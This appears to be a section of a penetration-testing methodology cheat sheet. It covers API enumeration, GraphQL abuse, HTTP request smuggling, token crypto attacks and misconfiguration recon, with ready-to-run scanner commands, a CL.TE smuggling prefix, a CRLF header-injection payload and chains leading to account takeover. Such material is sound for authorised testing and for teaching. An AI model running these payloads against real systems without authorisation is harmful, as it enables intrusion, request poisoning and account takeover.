## API-Specific Vulnerabilities

### REST API

- **[Primary Probe]** `kiterunner scan https://target/api -w routes-large.kite --max-connection-timeout 3` for undocumented endpoints
  - **[Signal: Undocumented 200/201]** Fuzz with Arjun: `arjun -u https://target/api/admin -m POST` for hidden params
  - **[Dead End: All 401]** Test verb tampering: `HEAD`/`OPTIONS` may bypass auth; `TRACE` may reflect headers
  - **[Dead End: Strict verbs]** HTTP parameter pollution: `?user_id=attacker&user_id=victim` — which does backend consume?

### GraphQL

- **[Primary Probe]** Test introspection: `{"query":"{__schema{types{name,fields{name}}}}"}`
  - **[Signal: Schema returned]** Map queries/mutations; identify sensitive ops (deleteUser, updateRole); test with manipulated auth
  - **[Dead End: Introspection disabled]** Field suggestion attack: misspell fields to enumerate schema
  - **[Dead End: No suggestions]** Wordlist fuzzing: `ffuf -u https://target/graphql -X POST -d '{"query":"{FUZZ}"}' -w graphql-fields.txt`
  - **[Dead End: All queries blocked]** Batching abuse: `[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"}]` bypasses per-request rate limits
  - **[Data Chaining]** GraphQL IDOR → admin email → password reset CSRF → ATO

### HTTP Request Smuggling

- **[Primary Probe]** `smuggler.py -u https://target/ -l` to detect CL.TE and TE.CL desync
  - **[Signal: CL.TE confirmed]** Craft prefix to poison next victim's request:
    ```
    POST / HTTP/1.1
    Content-Length: 6
    Transfer-Encoding: chunked

    0

    G
    ```
  - **[Dead End: Standard blocked]** H2.CL / H2.TE (HTTP/2 downgrade) via `h2csmuggler`: HTTP/2 front-end + HTTP/1.1 back-end
  - **[Dead End: HTTP/2 unsupported]** Header injection via CRLF in path: `GET /%0d%0aX-Forwarded-For:%20127.0.0.1`
  - **[Data Chaining]** Smuggling prefix → internal admin interface → bypass IP allowlist → trigger admin SSRF

## Cryptographic Weaknesses

- **[Primary Probe]** Inspect tokens/cookies for static IV, ECB mode, or predictable structure; check if same plaintext = same ciphertext (ECB)
  - **[Signal: ECB mode]** Byte-at-a-time decryption; block rearrangement for privilege escalation
  - **[Dead End: CBC mode]** CBC bit-flipping: flip ciphertext bits to modify plaintext fields (e.g., `user=attacker` → `user=admin`)
  - **[Dead End: GCM/AEAD]** Nonce reuse: collect ciphertexts, XOR to recover keystream
  - **[Dead End: Proper AEAD]** Padding oracle via side-channel: measure response time for CBC-encrypted tokens
  - **[Condition: Weak PRNG]** Collect 50+ tokens, run through `php_mt_seed` to derive seed and forecast future tokens

**Detect ECB:**
```bash
python3 -c "import sys,base64; c=base64.b64decode(sys.argv[1]); blks=[c[i:i+16] for i in range(0,len(c),16)]; print('ECB' if len(blks)!=len(set(blks)) else 'CBC')" "<cookie>"
```

## Misconfiguration & Information Disclosure

- **[Primary Probe]** `nuclei -u https://target -t exposures/ -t misconfiguration/ -severity medium,high,critical`
  - **[Signal: `.git` exposed]** `git-dumper https://target/.git/ ./dumped` → source → find creds, endpoints, logic
  - **[Signal: Swagger/OpenAPI exposed]** Import → enumerate all routes → fuzz with Arjun
  - **[Dead End: No common paths]** JS recon: `gau https://target | grep "\.js$" | httpx -mc 200 | xargs -I{} curl "{}" | grep -Eo "(api|/v|/internal|secret|token)[^\"]*"`
  - **[Dead End: JS minified]** Error handling: malformed JSON, wrong content-type → stack traces leaking framework, paths, DB strings
  - **[Dead End: Generic errors]** Infra recon: `nmap -sV -p 80,443,8080,9200,6379,5432,27017` → default pages, admin panels
  - **[Dead End: All filtered]** Subdomain takeover: `subfinder -d target.com | httpx -mc 404 | nuclei -t takeovers/`

***
